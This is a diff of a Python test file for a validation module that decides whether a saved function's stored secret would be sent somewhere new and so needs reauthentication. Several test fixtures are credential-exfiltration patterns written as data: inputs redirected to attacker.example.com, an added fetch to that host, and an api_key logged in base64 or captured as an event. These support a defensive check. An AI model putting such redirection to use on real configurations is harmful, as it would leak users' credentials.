@@ -1,4 +1,6 @@
 import json
+from dataclasses import replace
+from typing import Any, Optional
 
 import pytest
 from posthog.test.base import APIBaseTest, ClickhouseTestMixin, QueryMatchingTest
@@ -22,11 +24,8 @@ from products.cdp.backend.validation import (
     SecretBinding,
     compile_hog,
     credential_move_needs_reauth,
-    fetch_url_input_keys,
     generate_template_bytecode,
-    integration_link_needs_reauth,
     reserved_functions_used,
-    secret_binding_changed,
 )
 from products.messaging.backend.facade.api import validate_design
 
@@ -1602,136 +1601,102 @@ class TestReservedFunctionsUsed(SimpleTestCase):
         assert reserved_functions_used(hog) == expected
 
 
-class TestSecretBinding(SimpleTestCase):
-    @parameterized.expand(
-        [
-            ("direct", "fetch(inputs.url, {'body': inputs.body})", {"url"}),
-            ("string_template", "fetch(f'https://{inputs.host}/v1/{inputs.path}', {})", {"host", "path"}),
-            ("bracket_access", "fetch(inputs['url'], {})", {"url"}),
-            ("variable", "let base := inputs.host\nlet url := f'https://{base}/track'\nfetch(url, {})", {"host"}),
-            ("reassigned", "let url := 'https://a.example.com'\nurl := inputs.override\nfetch(url, {})", {"override"}),
-            ("function_param", "fun send(target) { fetch(target, {}) }\nsend(inputs.url)", {"url"}),
-            ("function_return", "fun target() { return inputs.url }\nfetch(target(), {})", {"url"}),
-            ("for_in", "for (let target in inputs.urls) { fetch(target, {}) }", {"urls"}),
-            ("constant_url", "fetch('https://api.example.com', {'body': inputs.body})", set()),
-            ("whole_inputs", "let config := inputs\nfetch(config.url, {})", None),
-            ("lambda_arg", "arrayMap(target -> fetch(target, {}), inputs.urls)", None),
-            ("fetch_alias", "let send := fetch\nsend(inputs.url, {})", None),
-            ("fetch_redefined", "fun fetch(target) { return target }\nfetch(inputs.url)", None),
-            ("input_overwritten", "inputs.url := 'https://attacker.example.com'\nfetch(inputs.url, {})", None),
-            ("typescript", "export function onLoad({ inputs }: any) { return fetch(inputs.url) }", None),
-        ]
-    )
-    def test_fetch_url_input_keys(self, _name: str, code: str, expected: set[str] | None) -> None:
-        keys = fetch_url_input_keys(code)
-        assert (set(keys) if keys is not None else None) == expected
-
-    CODE = "fetch(f'https://{inputs.host}/track', {'body': inputs.body})"
-    STORED = SecretBinding(
-        code=CODE,
-        inputs={"host": {"value": "api.example.com"}, "body": {"value": "a"}, "region": {"value": "us"}},
-    )
-
-    @parameterized.expand(
-        [
-            ("body_change", {}, {"body": {"value": "b"}}, None, False),
-            ("secret_value_ignored", {}, {"api_key": {"secret": True}}, None, False),
-            ("host_change", {}, {"host": {"value": "attacker.example.com"}}, None, True),
-            ("host_templates_another_input", {}, {"host": {"value": "{inputs.region}.example.com"}}, None, True),
-            ("code_change_keeps_fetch", {"code": f"{CODE}\nprint('sent')"}, {}, None, False),
-            (
-                "code_change_edits_fetch",
-                {"code": "fetch(f'https://{inputs.host}/track', {'body': inputs.body, 'method': 'PUT'})"},
-                {},
-                None,
-                True,
-            ),
-            ("code_change_moves_url", {"code": "fetch(inputs.body, {})"}, {}, None, True),
-            (
-                "code_change_adds_fetch",
-                {"code": f"{CODE}\nfetch('https://attacker.example.com', {{}})"},
-                {},
-                None,
-                True,
-            ),
-            ("mapping_overrides_host", {}, {}, [{"inputs": {"host": {"value": "attacker.example.com"}}}], True),
-            ("mapping_sets_body", {}, {}, [{"inputs": {"body": {"value": "c"}}}], False),
-        ]
-    )
-    def test_secret_binding_changed(
-        self, _name: str, binding_change: dict, input_changes: dict, mappings: list | None, expected: bool
-    ) -> None:
-        current = SecretBinding(
-            code=binding_change.get("code", self.CODE),
-            inputs={**self.STORED.inputs, **input_changes},
-            mappings=mappings,
-        )
-        assert secret_binding_changed(self.STORED, current, {"api_key"}) is expected
-
-    @parameterized.expand([("dotted", "{inputs.region}.example.com"), ("subscript", '{inputs["region"]}.example.com')])
-    def test_secret_binding_follows_an_input_templated_into_the_host(self, _name: str, host: str) -> None:
-        stored = SecretBinding(code=self.CODE, inputs={"host": {"value": host}, "region": {"value": "us"}})
-        current = SecretBinding(code=self.CODE, inputs={"host": {"value": host}, "region": {"value": "eu"}})
-
-        assert secret_binding_changed(stored, current, {"api_key"}) is True
-
-    INTEGRATION_SCHEMA = [
-        {"key": "host", "type": "string"},
-        {"key": "body", "type": "string"},
+class TestCredentialMoveNeedsReauth(SimpleTestCase):
+    CODE = "fetch(f'https://{inputs.host}/track', {'headers': {'Authorization': inputs.api_key}})"
+    SCHEMA = [
+        {"key": "host", "type": "string", "label": "Host"},
+        {"key": "region", "type": "string"},
+        {"key": "api_key", "type": "string", "secret": True},
         {"key": "connection", "type": "integration", "integration": "slack"},
     ]
+    INPUTS = {"host": {"value": "api.example.com"}, "region": {"value": "us"}}
+    STORED = SecretBinding(code=CODE, inputs=INPUTS, inputs_schema=SCHEMA)
+
+    def _schema_with(self, key: str, **changes: Any) -> list[dict]:
+        return [{**schema, **changes} if schema["key"] == key else schema for schema in self.SCHEMA]
 
     @parameterized.expand(
         [
-            ("not_linked", {"connection": {"value": None}}, None, None, False),
-            ("unchanged", {}, None, None, False),
-            ("body_change", {"body": {"value": "b"}}, None, None, False),
-            ("host_change", {"host": {"value": "attacker.example.com"}}, None, None, True),
-            # Logs are redacted, so code that reaches no fetch carries nothing out.
-            ("code_change_keeps_fetch", {}, f"{CODE}\nprint(inputs.connection)", None, False),
-            ("code_change_edits_fetch", {}, "fetch(inputs.host, {'body': inputs.connection})", None, True),
-            ("code_change_adds_fetch", {}, f"{CODE}\nfetch('https://new.example.com', {{}})", None, True),
-            ("mapping_overrides_host", {}, None, [{"inputs": {"host": {"value": "attacker.example.com"}}}], True),
+            ("unchanged", {}, False),
+            ("label_change", {"inputs_schema": [{**SCHEMA[0], "label": "Server"}, *SCHEMA[1:]]}, False),
+            ("secret_entered_again", {"inputs": {**INPUTS, "api_key": {"value": "rotated"}}}, False),
+            ("host_change", {"inputs": {**INPUTS, "host": {"value": "attacker.example.com"}}}, True),
+            # An input that picks the URL inside an `if` is as much the address as the URL itself.
+            ("branch_input_change", {"inputs": {**INPUTS, "region": {"value": "eu"}}}, True),
             (
-                "linked_in_mapping",
-                {"connection": {"value": None}},
-                None,
-                [
-                    {
-                        "inputs_schema": [{"key": "connection", "type": "integration", "integration": "slack"}],
-                        "inputs": {"connection": {"value": 2}},
-                    }
-                ],
+                "templating_change",
+                {"inputs": {**INPUTS, "host": {"value": "api.example.com", "templating": "hog"}}},
                 True,
             ),
+            ("log_line_added", {"code": f"{CODE}\nprint(base64Encode(inputs.api_key))"}, True),
+            ("capture_added", {"code": f"{CODE}\npostHogCapture({{'event': 'x', 'properties': inputs}})"}, True),
+            (
+                "host_marked_secret",
+                {
+                    "inputs": {**INPUTS, "host": {"value": "attacker.example.com"}},
+                    "inputs_schema": [{**SCHEMA[0], "secret": True}, *SCHEMA[1:]],
+                },
+                True,
+            ),
+            ("mapping_added", {"mappings": [{"inputs": {"host": {"value": "attacker.example.com"}}}]}, True),
         ]
     )
-    def test_integration_link_needs_reauth(
-        self, _name: str, input_changes: dict, code: str | None, mappings: list | None, expected: bool
-    ) -> None:
-        stored = SecretBinding(code=self.CODE, inputs={**self.STORED.inputs, "connection": {"value": 1}})
-        current = SecretBinding(code=code or self.CODE, inputs={**stored.inputs, **input_changes}, mappings=mappings)
-        assert integration_link_needs_reauth(stored, current, self.INTEGRATION_SCHEMA) is expected
+    def test_kept_secret(self, _name: str, changes: dict, expected: bool) -> None:
+        current = replace(self.STORED, **changes)
+        kept = set() if _name == "secret_entered_again" else {"api_key"}
 
-    SECRET_SCHEMA = [
-        {"key": "host", "type": "string"},
-        {"key": "body", "type": "string"},
-        {"key": "api_key", "type": "string", "secret": True},
-    ]
+        assert credential_move_needs_reauth(self.STORED, current, kept) is expected
+
+    def test_a_secret_entered_next_to_a_kept_one_counts_as_a_move(self) -> None:
+        schema = [*self.SCHEMA, {"key": "webhook_url", "type": "string", "secret": True}]
+        stored = SecretBinding(code=self.CODE, inputs=self.INPUTS, inputs_schema=schema)
+        current = SecretBinding(
+            code=self.CODE,
+            inputs={**self.INPUTS, "webhook_url": {"value": "https://attacker.example.com"}},
+            inputs_schema=schema,
+        )
+
+        assert credential_move_needs_reauth(stored, current, {"api_key"}) is True
+
+    def test_reordered_mappings_count_as_a_move(self) -> None:
+        mappings = [{"inputs": {"connection": {"value": 1}}}, {"inputs": {"connection": {"value": 2}}}]
+        stored = SecretBinding(code=self.CODE, inputs=self.INPUTS, inputs_schema=self.SCHEMA, mappings=mappings)
+        current = replace(stored, mappings=list(reversed(mappings)))
+
+        assert credential_move_needs_reauth(stored, current, {"api_key"}) is True
 
     @parameterized.expand(
         [
-            ("body_change", {"body": {"value": "b"}}, {"api_key"}, False),
-            ("host_change_keeping_the_secret", {"host": {"value": "new.example.com"}}, {"api_key"}, True),
-            # Entering the secret again in this save moves nothing, so it asks for no login.
-            ("host_change_entering_the_secret", {"host": {"value": "new.example.com"}}, set(), False),
-            ("host_change_nothing_stored", {"host": {"value": "new.example.com"}}, {"other"}, False),
+            ("new_link", None, {"connection": {"value": 1}}, None, True),
+            ("unchanged_link", {"connection": {"value": 1}}, {"connection": {"value": 1}}, None, False),
+            ("other_integration", {"connection": {"value": 1}}, {"connection": {"value": 2}}, None, True),
+            ("empty_multi_list", None, {"connection": {"value": []}}, None, False),
+            ("number_turned_integration", {"connection": {"value": 1}}, {"connection": {"value": 1}}, "number", True),
         ]
     )
-    def test_moving_a_typed_secret_needs_reauth_without_any_integration(
-        self, _name: str, input_changes: dict, kept: set[str], expected: bool
+    def test_linked_integration(
+        self,
+        _name: str,
+        stored_link: Optional[dict],
+        current_link: dict,
+        stored_type: Optional[str],
+        expected: bool,
     ) -> None:
-        stored = SecretBinding(code=self.CODE, inputs=self.STORED.inputs)
-        current = SecretBinding(code=self.CODE, inputs={**self.STORED.inputs, **input_changes})
+        stored = (
+            SecretBinding(
+                code=self.CODE,
+                inputs={**self.INPUTS, **stored_link},
+                inputs_schema=self._schema_with("connection", type=stored_type) if stored_type else self.SCHEMA,
+            )
+            if stored_link is not None
+            else None
+        )
+        current = SecretBinding(code=self.CODE, inputs={**self.INPUTS, **current_link}, inputs_schema=self.SCHEMA)
 
-        assert credential_move_needs_reauth(stored, current, self.SECRET_SCHEMA, {"api_key": stored}, kept) is expected
+        assert credential_move_needs_reauth(stored, current, set()) is expected
+
+    def test_a_staged_secret_is_checked_against_the_config_it_was_staged_with(self) -> None:
+        staged = replace(self.STORED, inputs={**self.INPUTS, "host": {"value": "new.example.com"}})
+
+        assert credential_move_needs_reauth(self.STORED, staged, {"api_key"}, {"api_key": staged}) is False
+        assert credential_move_needs_reauth(self.STORED, staged, {"api_key"}) is True
